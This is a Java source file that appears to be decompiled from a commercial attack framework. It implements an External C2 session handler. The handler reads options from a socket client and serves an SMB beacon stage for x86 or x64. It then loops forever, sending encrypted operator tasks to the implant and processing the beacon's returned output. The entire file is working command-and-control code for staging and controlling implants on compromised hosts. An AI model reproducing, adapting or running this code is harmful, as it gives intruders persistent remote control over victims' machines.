package extc2;

import beacon.BeaconC2;
import beacon.BeaconSetup;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.MudgeSanity;
import dialog.DialogUtils;

import java.io.*;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

@SuppressWarnings({"ALL", "UnusedAssignment"})
public class ExternalC2Session implements Runnable {
    protected Socket client;
    @SuppressWarnings("UnusedAssignment")
    protected BeaconSetup setup;
    protected BeaconC2 controller;
    protected InputStream in = null;
    protected OutputStream out = null;
    protected Map options = new HashMap();
    protected Set valid = CommonUtils.toSet("arch, type, pipename, block");

    protected void defaults() {
        this.options.put("block", "100");
        this.options.put("arch", "x86");
        this.options.put("type", "rdll");
        this.options.put("pipename", "externalc2");
    }

    public ExternalC2Session(BeaconSetup setup, Socket client) {
        this.client = client;
        this.setup = setup;
        this.controller = setup.getHandlers();
        this.defaults();
        new Thread(this, "External C2 client").start();
    }

    private byte[] Read4() throws IOException {
        byte[] length = new byte[4];
        int read2 = this.in.read(length);
        if (read2 != 4) {
            throw new IOException("Read expected 4 byte length, read: " + read2);
        }
        int size = CommonUtils.toIntLittleEndian(length);
        if (size < 0 || size > 4194304) {
            throw new IOException("Read size is odd: " + size);
        }
        byte[] result = new byte[size];
        for (int total = 0; total < size; total += read2) {
            read2 = this.in.read(result, total, size - total);
        }
        return result;
    }

    private void Write4(byte[] data) throws IOException {
        byte[] bdata = new byte[8];
        ByteBuffer buffer = ByteBuffer.wrap(bdata);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        buffer.putInt(data.length);
        this.out.write(bdata, 0, 4);
        this.out.flush();
        this.out.write(data, 0, data.length);
        this.out.flush();
    }

    public void setupIO() throws IOException {
        this.in = new BufferedInputStream(this.client.getInputStream(), 2097152);
        this.out = new BufferedOutputStream(this.client.getOutputStream(), 262144);
    }

    @Override
    public void run() {
        String bid = "";
        try {
            String command;
            byte[] stage;
            this.setupIO();
            while (!"go".equals(command = CommonUtils.bString(this.Read4()))) {
                String[] next = CommonUtils.toKeyValue(command);
                if (!this.valid.contains(next[0])) continue;
                this.options.put(next[0], next[1]);
            }
            String arch = DialogUtils.string(this.options, "arch");
            String pname = DialogUtils.string(this.options, "pipename");
            if ("x64".equals(arch)) {
                stage = this.setup.exportSMBStage("x64", pname);
                this.Write4(stage);
            } else if ("x86".equals(arch)) {
                stage = this.setup.exportSMBStage("x86", pname);
                this.Write4(stage);
            } else {
                CommonUtils.print_error("Invalid arch");
                this.Write4(new byte[0]);
            }
            byte[] metadata = CommonUtils.shift(this.Read4(), 4);
            bid = this.controller.process_beacon_metadata(null, metadata).getId();
            do {
                long waitUntil = System.currentTimeMillis() + (long) DialogUtils.number(this.options, "block");
                byte[] tasks = this.controller.dump(bid, 921600, 1048576);
                while (tasks.length == 0 && System.currentTimeMillis() < waitUntil) {
                    CommonUtils.sleep(100L);
                    tasks = this.controller.dump(bid, 921600, 1048576);
                }
                if (tasks.length > 0) {
                    byte[] data = this.controller.getSymmetricCrypto().encrypt(bid, tasks);
                    this.Write4(data);
                } else {
                    this.Write4(new byte[1]);
                }
                byte[] response = this.Read4();
                if (response.length != 1) {
                    this.controller.process_beacon_data(bid, response);
                }
                CommonUtils.sleep(100L);
            } while (true);
        } catch (Exception ex) {
            MudgeSanity.logException("External C2 session", ex, false);
            this.controller.getCheckinListener().output(BeaconOutput.Output(bid, CommonUtils.session(bid) + " connection lost."));
            this.controller.getResources().archive(BeaconOutput.Activity(bid, CommonUtils.session(bid) + " connection lost."));
            BeaconEntry entry = this.controller.getCheckinListener().resolve(bid);
            if (entry != null) {
                entry.die();
            }
            return;
        }
    }
}

